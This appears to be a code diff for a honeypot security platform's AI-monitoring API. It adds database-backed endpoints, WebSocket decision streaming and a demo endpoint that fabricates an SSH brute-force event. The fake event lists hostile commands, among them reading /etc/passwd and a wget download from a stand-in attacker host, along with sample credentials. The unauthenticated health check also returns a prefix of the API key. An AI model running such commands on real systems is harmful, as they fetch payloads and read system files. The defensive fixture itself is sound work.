@@ -2,6 +2,7 @@
 AI Monitoring API Endpoints.
 Real-time AI workflow visualization and control.
 """
+import logging
 from fastapi import APIRouter, Depends, HTTPException, WebSocket, WebSocketDisconnect
 from fastapi.responses import StreamingResponse
 from typing import List, Optional
@@ -19,6 +20,8 @@ from src.ai.monitoring import (
 )
 from src.api.v1.endpoints.auth import get_current_user
 
+logger = logging.getLogger(__name__)
+
 router = APIRouter(tags=["AI Monitoring"])
 
 
@@ -33,11 +36,35 @@ async def get_activities(
     limit: int = 20,
     current_user = Depends(get_current_user)
 ):
-    """Get recent AI activities."""
-    return {
-        "activities": ai_service.get_recent_activities(limit),
-        "total": len(ai_service.activities)
-    }
+    """Get recent AI activities from database."""
+    from src.core.db.session import get_db_context
+    from src.core.db.models import AIActivityDB
+    from sqlalchemy import select
+    
+    try:
+        async with get_db_context() as session:
+            result = await session.execute(
+                select(AIActivityDB)
+                .order_by(AIActivityDB.created_at.desc())
+                .limit(limit)
+            )
+            activities = result.scalars().all()
+            data = [{
+                "id": a.id,
+                "timestamp": a.created_at.isoformat() if a.created_at else None,
+                "status": a.status,
+                "action": a.action,
+                "details": a.details or {},
+                "duration_ms": a.duration_ms or 0,
+                "success": a.success or False,
+            } for a in activities]
+            return {"activities": data, "total": len(data)}
+    except Exception as e:
+        logger.warning(f"Failed to load activities from DB: {e}, using in-memory")
+        return {
+            "activities": ai_service.get_recent_activities(limit),
+            "total": len(ai_service.activities)
+        }
 
 
 @router.get("/decisions")
@@ -45,11 +72,32 @@ async def get_decisions(
     limit: int = 10,
     current_user = Depends(get_current_user)
 ):
-    """Get recent AI decisions."""
-    return {
-        "decisions": ai_service.get_recent_decisions(limit),
-        "total": len(ai_service.decisions)
-    }
+    """Get recent AI decisions from database."""
+    from src.core.db.session import get_db_context
+    from src.core.db.repositories import AIDecisionRepository
+    
+    try:
+        async with get_db_context() as session:
+            repo = AIDecisionRepository(session)
+            decisions = await repo.get_recent_decisions(limit=limit)
+            data = [{
+                "id": d.id,
+                "timestamp": d.created_at.isoformat() if d.created_at else None,
+                "source_ip": d.source_ip,
+                "threat_level": d.threat_level,
+                "threat_score": d.threat_score,
+                "reasoning": d.reasoning,
+                "action": d.action,
+                "confidence": d.confidence,
+                "mitre_attack_ids": d.mitre_attack_ids or [],
+            } for d in decisions]
+            return {"decisions": data, "total": len(data)}
+    except Exception as e:
+        logger.warning(f"Failed to load decisions from DB: {e}, using in-memory")
+        return {
+            "decisions": ai_service.get_recent_decisions(limit),
+            "total": len(ai_service.decisions)
+        }
 
 
 @router.post("/start")
@@ -90,12 +138,57 @@ async def trigger_analysis(
     return {"status": "queued", "event_id": attack_event.id}
 
 
+@router.post("/test-analysis")
+async def test_analysis_with_streaming(current_user = Depends(get_current_user)):
+    """Trigger a test analysis with LLM thought streaming for demo purposes."""
+    # Ensure AI service is running
+    if not ai_service.is_running:
+        await ai_service.start()
+    
+    # Discover actual honeypot containers
+    honeypot_id = "ssh-honeypot-01"  # Default fallback
+    try:
+        import docker
+        client = docker.from_env()
+        containers = client.containers.list(filters={"label": "honeypot.id"})
+        if containers:
+            # Use the first available honeypot
+            honeypot_id = containers[0].labels.get("honeypot.id", honeypot_id)
+            logger.info(f"Using honeypot: {honeypot_id}")
+    except Exception as e:
+        logger.warning(f"Could not discover honeypots: {e}")
+    
+    # Create a sample attack event
+    attack_event = AttackEvent(
+        id=f"test-{datetime.utcnow().timestamp()}",
+        source_ip="192.168.1.100",
+        honeypot_id=honeypot_id,  # Use actual honeypot ID
+        attack_type="ssh_brute_force",
+        timestamp=datetime.utcnow(),
+        severity="high",
+        raw_log="SSH session established, commands executed: whoami, cat /etc/passwd",
+        commands=["whoami", "cat /etc/passwd", "wget http://evil.com/malware.sh"],
+        credentials_tried=[{"username": "admin", "password": "admin123"}]
+    )
+    
+    # Process directly in background to ensure streaming works
+    asyncio.create_task(ai_service._analyze_event(attack_event))
+    
+    return {
+        "status": "processing", 
+        "event_id": attack_event.id,
+        "honeypot_id": honeypot_id,
+        "message": "Test analysis triggered. Watch the AI Monitor page for LLM thought streaming and decision execution."
+    }
+
+
 @router.websocket("/ws")
 async def ai_monitoring_websocket(websocket: WebSocket):
     """WebSocket for real-time AI activity updates."""
     await websocket.accept()
     
     async def send_activity(activity: AIActivity):
+        """Send activity update to WebSocket client."""
         try:
             await websocket.send_json({
                 "type": "activity",
@@ -109,11 +202,45 @@ async def ai_monitoring_websocket(websocket: WebSocket):
                     "success": activity.success
                 }
             })
-        except:
-            pass
+        except Exception as e:
+            logger.warning(f"Failed to send activity via WebSocket: {e}")
     
-    # Subscribe to updates
+    async def send_decision(decision: AIDecision):
+        """Send decision update to WebSocket client."""
+        try:
+            await websocket.send_json({
+                "type": "decision",
+                "data": {
+                    "id": decision.id,
+                    "timestamp": decision.timestamp.isoformat(),
+                    "source_ip": decision.source_ip,
+                    "threat_level": decision.threat_level.value,
+                    "threat_score": decision.threat_score,
+                    "reasoning": decision.reasoning,
+                    "action": decision.action,
+                    "confidence": decision.confidence,
+                    "mitre_attack_ids": decision.mitre_attack_ids,
+                }
+            })
+            logger.debug(f"Sent decision {decision.id} to AI WebSocket client")
+        except Exception as e:
+            logger.warning(f"Failed to send decision via WebSocket: {e}")
+    
+    # Subscribe to activity updates
     ai_service.subscribe(send_activity)
+    
+    # Subscribe to decision updates
+    if hasattr(ai_service, 'decision_subscribers'):
+        ai_service.decision_subscribers.append(send_decision)
+    else:
+        logger.warning("AI service does not have decision_subscribers list")
+    
+    # Also register with the main WebSocket manager for AI channel broadcasts
+    from src.api.v1.endpoints.websocket import manager as ws_manager
+    from src.api.v1.endpoints.websocket import ConnectionManager
+    
+    # Subscribe this connection to the "ai" channel
+    ws_manager.subscribe(websocket, ["ai"])
     
     try:
         # Send initial status
@@ -128,6 +255,12 @@ async def ai_monitoring_websocket(websocket: WebSocket):
             "data": ai_service.get_recent_activities(10)
         })
         
+        # Send recent decisions
+        await websocket.send_json({
+            "type": "decisions",
+            "data": ai_service.get_recent_decisions(10)
+        })
+        
         # Keep connection alive
         while True:
             data = await websocket.receive_text()
@@ -138,65 +271,140 @@ async def ai_monitoring_websocket(websocket: WebSocket):
                     "type": "status",
                     "data": ai_service.get_status()
                 })
+            elif data == "decisions":
+                await websocket.send_json({
+                    "type": "decisions",
+                    "data": ai_service.get_recent_decisions(10)
+                })
                 
     except WebSocketDisconnect:
-        pass
+        logger.debug("AI WebSocket client disconnected")
     except Exception as e:
-        print(f"WebSocket error: {e}")
+        logger.error(f"AI WebSocket error: {e}")
     finally:
-        # Unsubscribe
+        # Unsubscribe from activity updates
         if send_activity in ai_service.subscribers:
             ai_service.subscribers.remove(send_activity)
+        # Unsubscribe from decision updates
+        if hasattr(ai_service, 'decision_subscribers') and send_decision in ai_service.decision_subscribers:
+            ai_service.decision_subscribers.remove(send_decision)
 
 
 @router.get("/metrics")
 async def get_ai_metrics(current_user = Depends(get_current_user)):
-    """Get AI performance metrics."""
-    activities = list(ai_service.activities)
-    decisions = list(ai_service.decisions)
+    """Get AI performance metrics from database."""
+    from src.core.db.session import get_db_context
+    from src.core.db.models import AIActivityDB, AIDecisionDB
+    from sqlalchemy import select, func
     
-    # Calculate metrics
-    total_activities = len(activities)
-    successful = sum(1 for a in activities if a.success)
-    failed = total_activities - successful
-    
-    # Count by status
-    status_counts = {}
-    for activity in activities:
-        status = activity.status.value
-        status_counts[status] = status_counts.get(status, 0) + 1
-    
-    # Count decisions by action
-    action_counts = {}
-    for decision in decisions:
-        action = decision.action
-        action_counts[action] = action_counts.get(action, 0) + 1
-    
-    # Average threat score
-    avg_threat = 0
-    if decisions:
-        avg_threat = sum(d.threat_score for d in decisions) / len(decisions)
-    
-    return {
-        "total_activities": total_activities,
-        "successful_activities": successful,
-        "failed_activities": failed,
-        "success_rate": successful / total_activities if total_activities > 0 else 0,
-        "status_distribution": status_counts,
-        "total_decisions": len(decisions),
-        "action_distribution": action_counts,
-        "average_threat_score": round(avg_threat, 3),
-        "pending_events": len(ai_service.pending_events),
-        "active_sessions": len(ai_service.active_sessions)
-    }
+    try:
+        async with get_db_context() as session:
+            # Get activity metrics from database
+            total_result = await session.execute(
+                select(func.count()).select_from(AIActivityDB)
+            )
+            total_activities = total_result.scalar() or 0
+            
+            successful_result = await session.execute(
+                select(func.count()).select_from(AIActivityDB)
+                .where(AIActivityDB.success == True)
+            )
+            successful = successful_result.scalar() or 0
+            
+            failed = total_activities - successful
+            
+            # Status distribution
+            status_result = await session.execute(
+                select(AIActivityDB.status, func.count())
+                .group_by(AIActivityDB.status)
+            )
+            status_counts = dict(status_result.all())
+            
+            # Decision metrics
+            decision_count_result = await session.execute(
+                select(func.count()).select_from(AIDecisionDB)
+            )
+            total_decisions = decision_count_result.scalar() or 0
+            
+            # Action distribution
+            action_result = await session.execute(
+                select(AIDecisionDB.action, func.count())
+                .group_by(AIDecisionDB.action)
+            )
+            action_counts = dict(action_result.all())
+            
+            # Average threat score
+            avg_result = await session.execute(
+                select(func.avg(AIDecisionDB.threat_score))
+            )
+            avg_threat = avg_result.scalar() or 0
+            
+            return {
+                "total_activities": total_activities,
+                "successful_activities": successful,
+                "failed_activities": failed,
+                "success_rate": successful / total_activities if total_activities > 0 else 0,
+                "status_distribution": status_counts,
+                "total_decisions": total_decisions,
+                "action_distribution": action_counts,
+                "average_threat_score": round(float(avg_threat), 3),
+                "pending_events": len(ai_service.pending_events),
+                "active_sessions": len(ai_service.active_sessions)
+            }
+    except Exception as e:
+        logger.warning(f"Failed to load metrics from DB: {e}, using in-memory")
+        # Fall back to in-memory
+        activities = list(ai_service.activities)
+        decisions = list(ai_service.decisions)
+        
+        total_activities = len(activities)
+        successful = sum(1 for a in activities if a.success)
+        failed = total_activities - successful
+        
+        status_counts = {}
+        for activity in activities:
+            status = activity.status.value
+            status_counts[status] = status_counts.get(status, 0) + 1
+        
+        action_counts = {}
+        for decision in decisions:
+            action = decision.action
+            action_counts[action] = action_counts.get(action, 0) + 1
+        
+        avg_threat = 0
+        if decisions:
+            avg_threat = sum(d.threat_score for d in decisions) / len(decisions)
+        
+        return {
+            "total_activities": total_activities,
+            "successful_activities": successful,
+            "failed_activities": failed,
+            "success_rate": successful / total_activities if total_activities > 0 else 0,
+            "status_distribution": status_counts,
+            "total_decisions": len(decisions),
+            "action_distribution": action_counts,
+            "average_threat_score": round(avg_threat, 3),
+            "pending_events": len(ai_service.pending_events),
+            "active_sessions": len(ai_service.active_sessions)
+        }
 
 
 @router.get("/health")
 async def ai_health_check():
     """Health check for AI service."""
+    api_key = ai_service.llm_client.api_key
+    placeholder_keys = ["sk-your-api-key-here", "sk-local", "sk-placeholder", "sk-test", "local"]
+    api_key_valid = (
+        api_key and 
+        api_key.startswith("sk-") and 
+        api_key not in placeholder_keys
+    )
+    
     return {
         "status": "healthy" if ai_service.is_running else "stopped",
         "llm_available": await ai_service.llm_client.health_check(),
+        "api_key_configured": api_key_valid,
+        "api_key_prefix": api_key[:10] + "..." if api_key else "not set",
     }
 
 
@@ -276,33 +484,6 @@ async def trigger_manual_action(
         threat_level="medium",
     )
 
-    return {
-        "execution_id": result.id,
-        "status": result.status.value,
-        "error": result.error,
-        "details": result.details
-    }
-    honeypot_id = action.get("honeypot_id")
-    source_ip = action.get("source_ip", "manual")
-    config_changes = action.get("config_changes", {})
-    
-    if action_type not in ["monitor", "reconfigure", "isolate", "switch_container"]:
-        raise HTTPException(status_code=400, detail="Invalid action type")
-    
-    if not honeypot_id:
-        raise HTTPException(status_code=400, detail="honeypot_id required")
-    
-    executor = get_executor()
-    
-    result = await executor.execute(
-        decision_id=f"manual-{int(datetime.utcnow().timestamp() * 1000)}",
-        action=action_type,
-        source_ip=source_ip,
-        honeypot_id=honeypot_id,
-        configuration_changes=config_changes,
-        threat_level="medium",
-    )
-    
     return {
         "execution_id": result.id,
         "status": result.status.value,
